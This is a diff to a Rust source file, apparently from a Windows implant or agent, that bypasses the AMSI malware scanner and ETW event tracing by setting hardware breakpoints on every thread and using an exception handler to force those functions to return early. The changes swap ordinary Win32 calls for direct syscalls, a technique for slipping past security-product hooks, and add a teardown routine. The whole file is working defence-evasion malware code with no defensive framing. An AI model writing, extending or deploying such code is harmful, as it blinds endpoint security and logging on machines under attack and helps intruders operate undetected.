@@ -20,10 +20,16 @@ static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
 static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
 /// Pre-computed address of a `ret` (0xC3) gadget found during
 /// `setup_hardware_breakpoints`.  Using a static avoids any memory scan or
-/// `VirtualQuery` call from inside the VEH handler, where those calls risk
+/// NtQueryVirtualMemory call from inside the VEH handler, where those calls risk
 /// deadlock (loader lock / heap lock contention).
 #[cfg(windows)]
 static RET_GADGET: AtomicUsize = AtomicUsize::new(0);
+
+/// Handle returned by `AddVectoredExceptionHandler`, stored as a `usize`.
+/// Zero means no handler is registered.  Uses `AtomicUsize` (not `OnceLock`)
+/// so that `disable_evasion` can reset it after removal.
+#[cfg(windows)]
+static VEH_HANDLE: AtomicUsize = AtomicUsize::new(0);
 
 #[cfg(windows)]
 unsafe extern "system" fn veh_handler(
@@ -40,9 +46,9 @@ unsafe extern "system" fn veh_handler(
         if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
             // Bypass by clearing RAX (returning 0) and advancing RIP to a
             // pre-computed ret gadget.  The gadget address was resolved and
-            // validated with VirtualQuery during setup_hardware_breakpoints,
+            // validated with NtQueryVirtualMemory during setup_hardware_breakpoints,
             // before this handler was registered.  Scanning memory or calling
-            // VirtualQuery here would risk deadlock (loader-lock / heap-lock
+            // NtQueryVirtualMemory here would risk deadlock (loader-lock / heap-lock
             // contention inside a VEH handler).
             (*context).Rax = 0;
             let gadget = RET_GADGET.load(Ordering::Relaxed);
@@ -63,9 +69,9 @@ unsafe extern "system" fn veh_handler(
 #[cfg(windows)]
 pub unsafe fn setup_hardware_breakpoints() {
     use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
-    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
+    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
     use winapi::um::processthreadsapi::{
-        GetCurrentProcessId, GetThreadContext, OpenThread, ResumeThread, SetThreadContext,
+        OpenThread, ResumeThread,
         SuspendThread,
     };
     use winapi::um::tlhelp32::{
@@ -122,10 +128,9 @@ pub unsafe fn setup_hardware_breakpoints() {
         }
 
         // Pre-compute a `ret` gadget from NtClose so that veh_handler never
-        // needs to scan memory or call VirtualQuery at exception time.
-        // VirtualQuery is safe here (not inside a VEH handler).
+        // needs to scan memory or call NtQueryVirtualMemory at exception time.
+        // NtQueryVirtualMemory is safe here (not inside a VEH handler).
         'gadget: {
-            use winapi::um::memoryapi::VirtualQuery;
             use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE_READ};
 
             let nt_close_raw =
@@ -142,12 +147,17 @@ pub unsafe fn setup_hardware_breakpoints() {
             for _ in 0..MAX_DEPTH {
                 // Verify the current byte is readable before peeking at the opcode.
                 let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
-                if VirtualQuery(
-                    p as *const _,
-                    &mut mbi,
-                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
-                ) == 0
-                    || mbi.State != MEM_COMMIT
+                let mut return_len: usize = 0;
+                let vq_status = syscall!(
+                    "NtQueryVirtualMemory",
+                    -1i64 as u64,                          // NtCurrentProcess()
+                    p as u64,                               // BaseAddress
+                    0u64,                                   // MemoryBasicInformation
+                    &mut mbi as *mut _ as u64,              // Buffer
+                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
+                    &mut return_len as *mut _ as u64,       // ReturnLength
+                );
+                if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT
                 {
                     break 'gadget;
                 }
@@ -174,7 +184,7 @@ pub unsafe fn setup_hardware_breakpoints() {
             }
 
             // Scan up to 64 bytes for 0xC3 (ret), verifying each page with
-            // VirtualQuery before the first dereference on that page.
+            // NtQueryVirtualMemory before the first dereference on that page.
             let mut last_page: usize = usize::MAX;
             for _ in 0..64usize {
                 let addr = p as usize;
@@ -182,12 +192,17 @@ pub unsafe fn setup_hardware_breakpoints() {
                 if page != last_page {
                     // New page: verify it is committed and readable/executable.
                     let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
-                    if VirtualQuery(
-                        p as *const _,
-                        &mut mbi,
-                        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
-                    ) == 0
-                        || mbi.State != MEM_COMMIT
+                    let mut return_len: usize = 0;
+                    let vq_status = syscall!(
+                        "NtQueryVirtualMemory",
+                        -1i64 as u64,                          // NtCurrentProcess()
+                        p as u64,                               // BaseAddress
+                        0u64,                                   // MemoryBasicInformation
+                        &mut mbi as *mut _ as u64,              // Buffer
+                        std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
+                        &mut return_len as *mut _ as u64,       // ReturnLength
+                    );
+                    if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT
                     {
                         break 'gadget;
                     }
@@ -234,15 +249,32 @@ pub unsafe fn setup_hardware_breakpoints() {
     }
 
     // Register our VEH first; store the handle so it can be removed later
-    // via RemoveVectoredExceptionHandler if needed (M-25 fix).
-    static VEH_HANDLE: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    // via RemoveVectoredExceptionHandler (see disable_evasion).
     let veh = AddVectoredExceptionHandler(1, Some(veh_handler));
     if !veh.is_null() {
-        VEH_HANDLE.get_or_init(|| veh as usize);
+        VEH_HANDLE.store(veh as usize, Ordering::Release);
     }
 
     // Propagate hardware breakpoints to all existing threads in the process
-    let pid = GetCurrentProcessId();
+    // GetCurrentProcessId → NtQueryInformationProcess(ProcessBasicInformation)
+    #[repr(C)]
+    struct Pbi {
+        reserved1: *mut std::ffi::c_void,
+        peb_base_address: *mut std::ffi::c_void,
+        reserved2: [*mut std::ffi::c_void; 2],
+        unique_process_id: usize,
+        inherited_from_unique_process_id: usize,
+    }
+    let mut pbi: Pbi = std::mem::zeroed();
+    let _ = syscall!(
+        "NtQueryInformationProcess",
+        (-1isize) as u64, // NtCurrentProcess()
+        0u64,              // ProcessBasicInformation
+        &mut pbi as *mut _ as u64,
+        std::mem::size_of::<Pbi>() as u64,
+        std::ptr::null_mut::<u64>() as u64,
+    );
+    let pid = pbi.unique_process_id as u32;
     let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if snapshot != INVALID_HANDLE_VALUE {
         let mut te32: THREADENTRY32 = std::mem::zeroed();
@@ -260,7 +292,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 "evasion: SuspendThread failed for tid {} — skipping context modification",
                                 te32.th32ThreadID
                             );
-                            CloseHandle(h_thread);
+                            let _ = syscall!("NtClose", h_thread as u64);
                             // Continue to next thread; don't attempt context changes
                             // on a thread we couldn't suspend.
                             if Thread32Next(snapshot, &mut te32) == 0 {
@@ -272,35 +304,47 @@ pub unsafe fn setup_hardware_breakpoints() {
                         // (5) Save original context for restoration on error.
                         let mut orig_ctx: CONTEXT = std::mem::zeroed();
                         orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-                        let _orig_saved = if let Some(nt_get_ctx) = nt_get_context_thread {
-                            let status = nt_get_ctx(h_thread, &mut orig_ctx);
-                            if status >= 0 {
-                                true
+                            let got_ctx_fallback = {
+                                let s = syscall!(
+                                    "NtGetContextThread",
+                                    h_thread as u64,
+                                    &mut orig_ctx as *mut _ as u64,
+                                );
+                                s.is_ok() && s.unwrap() >= 0
+                            };
+                            let _orig_saved = if let Some(nt_get_ctx) = nt_get_context_thread {
+                                let status = nt_get_ctx(h_thread, &mut orig_ctx);
+                                if status >= 0 { true } else { got_ctx_fallback }
                             } else {
-                                GetThreadContext(h_thread, &mut orig_ctx) != 0
-                            }
-                        } else {
-                            GetThreadContext(h_thread, &mut orig_ctx) != 0
-                        };
+                                got_ctx_fallback
+                            };
 
                         // (2) GetThreadContext: returns 0 on failure.
                         let mut ctx: CONTEXT = std::mem::zeroed();
                         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-                        let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
-                            let status = nt_get_ctx(h_thread, &mut ctx);
-                            if status >= 0 {
-                                true
-                            } else {
-                                log::warn!(
-                                    "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to GetThreadContext",
-                                    te32.th32ThreadID,
-                                    status as u32
+                        let ctx_fallback = {
+                                let s = syscall!(
+                                    "NtGetContextThread",
+                                    h_thread as u64,
+                                    &mut ctx as *mut _ as u64,
                                 );
-                                GetThreadContext(h_thread, &mut ctx) != 0
-                            }
-                        } else {
-                            GetThreadContext(h_thread, &mut ctx) != 0
-                        };
+                                s.is_ok() && s.unwrap() >= 0
+                            };
+                            let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
+                                let status = nt_get_ctx(h_thread, &mut ctx);
+                                if status >= 0 {
+                                    true
+                                } else {
+                                    log::warn!(
+                                        "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
+                                        te32.th32ThreadID,
+                                        status as u32
+                                    );
+                                    ctx_fallback
+                                }
+                            } else {
+                                ctx_fallback
+                            };
 
                         if !got_context {
                             log::warn!(
@@ -308,7 +352,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 te32.th32ThreadID
                             );
                             ResumeThread(h_thread);
-                            CloseHandle(h_thread);
+                            let _ = syscall!("NtClose", h_thread as u64);
                             if Thread32Next(snapshot, &mut te32) == 0 {
                                 break;
                             }
@@ -321,34 +365,48 @@ pub unsafe fn setup_hardware_breakpoints() {
                         // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
                         ctx.Dr7 |= (1 << 0) | (1 << 2);
 
-                        let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
-                            let status = nt_set_ctx(h_thread, &mut ctx);
-                            if status < 0 {
-                                log::warn!(
-                                    "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to SetThreadContext",
-                                    te32.th32ThreadID,
-                                    status as u32
+                        let set_fallback = {
+                                let s = syscall!(
+                                    "NtSetContextThread",
+                                    h_thread as u64,
+                                    &mut ctx as *mut _ as u64,
                                 );
-                                SetThreadContext(h_thread, &ctx) != 0
+                                s.is_ok() && s.unwrap() >= 0
+                            };
+                            let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
+                                let status = nt_set_ctx(h_thread, &mut ctx);
+                                if status < 0 {
+                                    log::warn!(
+                                        "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
+                                        te32.th32ThreadID,
+                                        status as u32
+                                    );
+                                    set_fallback
+                                } else {
+                                    true
+                                }
                             } else {
-                                true
-                            }
-                        } else {
-                            SetThreadContext(h_thread, &ctx) != 0
-                        };
+                                set_fallback
+                            };
 
                         // (3) Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
                         if set_ok {
                             let mut verify_ctx: CONTEXT = std::mem::zeroed();
                             verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-                            let verify_ok = if let Some(nt_get_ctx) = nt_get_context_thread {
-                                let status = nt_get_ctx(h_thread, &mut verify_ctx);
-                                if status >= 0 { true } else {
-                                    GetThreadContext(h_thread, &mut verify_ctx) != 0
-                                }
-                            } else {
-                                GetThreadContext(h_thread, &mut verify_ctx) != 0
-                            };
+                            let verify_fallback = {
+                                    let s = syscall!(
+                                        "NtGetContextThread",
+                                        h_thread as u64,
+                                        &mut verify_ctx as *mut _ as u64,
+                                    );
+                                    s.is_ok() && s.unwrap() >= 0
+                                };
+                                let verify_ok = if let Some(nt_get_ctx) = nt_get_context_thread {
+                                    let status = nt_get_ctx(h_thread, &mut verify_ctx);
+                                    if status >= 0 { true } else { verify_fallback }
+                                } else {
+                                    verify_fallback
+                                };
 
                             if !verify_ok
                                 || verify_ctx.Dr0 != ctx.Dr0
@@ -366,7 +424,12 @@ pub unsafe fn setup_hardware_breakpoints() {
                                     let _ = if let Some(nt_set_ctx) = nt_set_context_thread {
                                         nt_set_ctx(h_thread, &mut orig_ctx)
                                     } else {
-                                        if SetThreadContext(h_thread, &orig_ctx) != 0 { 0 } else { -1 }
+                                        let s = syscall!(
+                                            "NtSetContextThread",
+                                            h_thread as u64,
+                                            &mut orig_ctx as *mut _ as u64,
+                                        );
+                                        if s.is_ok() && s.unwrap() >= 0 { 0i32 } else { -1i32 }
                                     };
                                 }
                             }
@@ -391,7 +454,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 te32.th32ThreadID
                             );
                         }
-                        CloseHandle(h_thread);
+                        let _ = syscall!("NtClose", h_thread as u64);
                     }
                 }
                 if Thread32Next(snapshot, &mut te32) == 0 {
@@ -399,7 +462,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                 }
             }
         }
-        CloseHandle(snapshot);
+        let _ = syscall!("NtClose", snapshot as u64);
     }
 }
 
@@ -624,6 +687,38 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         }
     }
 }
+
+/// Tear down all evasion mechanisms so the agent can shut down cleanly.
+///
+/// Removes the VEH handler (if registered) via `RemoveVectoredExceptionHandler`
+/// and clears the AMSI / ETW breakpoint addresses so any remaining hardware
+/// breakpoints become benign (they will no longer match `Rip`).
+///
+/// # Safety
+///
+/// Must be called before process exit.  After this call returns, AMSI and ETW
+/// are no longer bypassed.  Call from the agent shutdown path.
+#[cfg(windows)]
+pub unsafe fn disable_evasion() {
+    use winapi::um::errhandlingapi::RemoveVectoredExceptionHandler;
+
+    let handle = VEH_HANDLE.load(Ordering::Acquire);
+    if handle != 0 {
+        RemoveVectoredExceptionHandler(handle as *mut _);
+        VEH_HANDLE.store(0, Ordering::Release);
+        log::info!("evasion: VEH handler removed (handle={:#x})", handle);
+    }
+
+    // Clear hardware breakpoint addresses so stale Dr0/Dr1 values no longer
+    // trigger the (now-removed) VEH handler.
+    AMSI_ADDR.store(0, Ordering::Relaxed);
+    ETW_ADDR.store(0, Ordering::Relaxed);
+    RET_GADGET.store(0, Ordering::Relaxed);
+}
+
+/// No-op on non-Windows.
+#[cfg(not(windows))]
+pub unsafe fn disable_evasion() {}
 
 pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
 where
